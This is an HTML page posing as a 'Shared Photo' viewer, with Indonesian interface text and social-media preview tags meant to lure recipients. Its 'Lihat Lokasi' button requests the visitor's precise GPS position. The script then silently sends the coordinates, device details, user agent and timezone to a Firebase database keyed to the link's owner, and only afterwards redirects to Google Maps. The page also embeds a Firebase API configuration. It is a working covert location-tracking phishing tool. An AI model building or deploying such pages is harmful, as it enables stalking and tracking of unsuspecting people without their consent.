<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
<title>Shared Photo</title>

<meta property="og:title" content="Shared Photo" />
<meta property="og:description" content="A photo has been shared with you. View the photo and its location details." />
<meta property="og:image" content="https://infocuaca.online/preview.jpg" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:image:type" content="image/jpeg" />
<meta property="og:url" content="https://infocuaca.online/view.html" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="infocuaca.online" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Shared Photo" />
<meta name="twitter:description" content="A photo has been shared with you. View the photo and its location details." />
<meta name="twitter:image" content="https://infocuaca.online/preview.jpg" />

<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;background:#000;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif}

/* ══ FULL PHOTO WRAP ══ */
.photo-wrap{
  position:relative;
  width:100%;
  height:100vh;
  height:100dvh;              /* fix viewport mobile */
  display:flex;
  align-items:center;
  justify-content:center;
  overflow:hidden;
}
#mainPhoto{
  position:absolute;
  inset:0;
  width:100%;
  height:100%;
  object-fit:cover;
  display:block;
  user-select:none;
  -webkit-user-drag:none;
  z-index:1;
}

/* ══ DARK VIGNETTE supaya tombol kontras ══ */
.vignette{
  position:absolute;
  inset:0;
  background:radial-gradient(ellipse at center,
    rgba(0,0,0,.15) 0%,
    rgba(0,0,0,.35) 60%,
    rgba(0,0,0,.55) 100%);
  z-index:2;
  pointer-events:none;
}

/* ══ CENTER BUTTON WRAP ══ */
.center-wrap{
  position:absolute;
  inset:0;
  display:flex;
  align-items:center;
  justify-content:center;
  z-index:3;
  padding:24px;
}

/* ══ BUTTON ══ */
.btn-lokasi{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  padding:16px 28px;
  background:#4CAF50;
  color:#fff;
  border:none;
  border-radius:50px;
  font-size:16px;
  font-weight:700;
  letter-spacing:.3px;
  cursor:pointer;
  font-family:inherit;
  box-shadow:0 8px 32px rgba(0,0,0,.55),0 0 0 1px rgba(255,255,255,.08) inset;
  transition:background .15s,transform .1s,opacity .15s;
  white-space:nowrap;
  backdrop-filter:blur(2px);
  -webkit-backdrop-filter:blur(2px);
}
.btn-lokasi:active{background:#388E3C;transform:scale(.96)}
.btn-lokasi:disabled{opacity:.7;cursor:not-allowed}
.btn-lokasi svg{width:20px;height:20px;fill:#fff;flex-shrink:0}

/* ══ SPINNER inside button ══ */
.spinner{
  width:18px;height:18px;
  border:2.5px solid rgba(255,255,255,.35);
  border-top-color:#fff;
  border-radius:50%;
  animation:spin .7s linear infinite;
  flex-shrink:0;
}
@keyframes spin{to{transform:rotate(360deg)}}

/* ══ INVALID LINK SCREEN ══ */
.err-screen{
  position:fixed;inset:0;
  background:#0d0d0d;
  color:#fff;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  gap:14px;
  padding:32px;
  text-align:center;
  z-index:10;
}
.err-screen .err-icon{
  width:72px;height:72px;
  border-radius:50%;
  background:rgba(245,124,0,.15);
  display:flex;align-items:center;justify-content:center;
  margin-bottom:4px;
}
.err-screen .err-icon svg{width:36px;height:36px;fill:#F57C00}
.err-title{font-size:17px;font-weight:700}
.err-desc{font-size:13px;color:#888;line-height:1.6}

/* ══ TOAST ══ */
.toast{
  position:fixed;
  bottom:24px;left:50%;
  transform:translateX(-50%) translateY(20px);
  background:rgba(20,20,20,.92);
  color:#fff;
  padding:13px 20px;
  border-radius:10px;
  font-size:13px;
  text-align:center;
  max-width:calc(100vw - 48px);
  opacity:0;
  transition:opacity .3s,transform .3s;
  pointer-events:none;
  z-index:999;
  backdrop-filter:blur(8px);
  -webkit-backdrop-filter:blur(8px);
  border:1px solid rgba(255,255,255,.1);
  line-height:1.4;
}
.toast.show{
  opacity:1;
  transform:translateX(-50%) translateY(0);
}

.hide{display:none!important}
</style>
</head>
<body>

<!-- ══ INVALID LINK ══ -->
<div class="err-screen hide" id="errBox">
  <div class="err-icon">
    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
    </svg>
  </div>
  <div class="err-title">Link Tidak Valid</div>
  <div class="err-desc">Foto ini tidak tersedia<br>atau link sudah kadaluarsa.</div>
</div>

<!-- ══ MAIN VIEW ══ -->
<div class="photo-wrap" id="photoWrap">
  <img id="mainPhoto" alt="Shared photo">
  <div class="vignette"></div>

  <!-- Tombol di tengah -->
  <div class="center-wrap">
    <button class="btn-lokasi" id="btnLokasi" onclick="handleLokasi()">
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
      </svg>
      Lihat Lokasi
    </button>
  </div>
</div>

<!-- ══ TOAST ══ -->
<div class="toast" id="toast"></div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

const FC = {
  apiKey:"AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
  authDomain:"roraxbali-65802.firebaseapp.com",
  databaseURL:"https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId:"roraxbali-65802",
  storageBucket:"roraxbali-65802.firebasestorage.app",
  messagingSenderId:750633313866,
  appId:"1:750636313866:web:3d2e552960e06db83968b3"
};

// ══ Firebase init dengan guard ══
let db = null;
try {
  const app = initializeApp(FC);
  db = getDatabase(app);
} catch(e) {
  console.warn('Firebase gagal init:', e);
}

// ══ PARAMS (decode!) ══
const params    = new URLSearchParams(location.search);
const fotoUrl   = decodeURIComponent(params.get('foto') || '');
const ownerUser = decodeURIComponent(params.get('u')    || '');

// ══ ELEMENTS ══
const photoWrap = document.getElementById('photoWrap');
const mainPhoto = document.getElementById('mainPhoto');
const errBox    = document.getElementById('errBox');
const btnLokasi = document.getElementById('btnLokasi');
const toast     = document.getElementById('toast');

// ══ SHOW ERROR ══
function showError() {
  photoWrap.classList.add('hide');
  errBox.classList.remove('hide');
}

// ══ VALIDATE & SHOW PHOTO ══
if (!fotoUrl || !ownerUser) {
  showError();
} else {
  // Timeout fallback kalau gambar stuck
  const imgTimeout = setTimeout(() => {
    if (!mainPhoto.complete || mainPhoto.naturalWidth === 0) {
      showError();
    }
  }, 12000);

  mainPhoto.onload = () => {
    clearTimeout(imgTimeout);
    if (mainPhoto.naturalWidth === 0) showError();
  };
  mainPhoto.onerror = () => {
    clearTimeout(imgTimeout);
    showError();
  };

  mainPhoto.src = fotoUrl;
}

// ══ TOAST HELPER ══
let toastTimer;
function showToast(msg, dur = 3500) {
  clearTimeout(toastTimer);
  toast.textContent = msg;
  toast.classList.add('show');
  toastTimer = setTimeout(() => toast.classList.remove('show'), dur);
}

// ══ BUTTON LOADING STATE ══
function setLoading(on) {
  btnLokasi.disabled = on;
  if (on) {
    btnLokasi.innerHTML = `<div class="spinner"></div> Mencari lokasi…`;
  } else {
    btnLokasi.innerHTML = `
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
      </svg>
      Lihat Lokasi`;
  }
}

// ══ HANDLE BUTTON CLICK ══
window.handleLokasi = function () {
  if (!navigator.geolocation) {
    showToast('Browser ini tidak mendukung GPS.');
    return;
  }
  setLoading(true);

  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude;
      const lng = pos.coords.longitude;

      // Simpan ke Firebase (kalau tersedia)
      if (db) {
        try {
          push(ref(db, 'lokasi/' + ownerUser), {
            target:    'images',
            waktu:     Date.now(),
            lat,
            lng,
            akurasi:   pos.coords.accuracy,
            foto:      fotoUrl,
            platform:  navigator.platform || 'Unknown',
            userAgent: navigator.userAgent,
            timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen:    screen.width + 'x' + screen.height,
            via:       'view',
            source:    'view.html'
          }).catch(() => {});
        } catch(e) {}
      }

      // Langsung ke Google Maps
      window.location.href = 'https://www.google.com/maps?q=' + lat + ',' + lng;
    },
    err => {
      setLoading(false);
      if (err.code === err.PERMISSION_DENIED) {
        showToast('Akses lokasi ditolak. Izinkan di pengaturan browser lalu coba lagi.', 4500);
      } else if (err.code === err.TIMEOUT) {
        showToast('Timeout. Coba lagi di area dengan sinyal lebih baik.');
      } else {
        showToast('Gagal mendapatkan lokasi. Coba lagi.');
      }
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
};
</script>
</body>
</html>
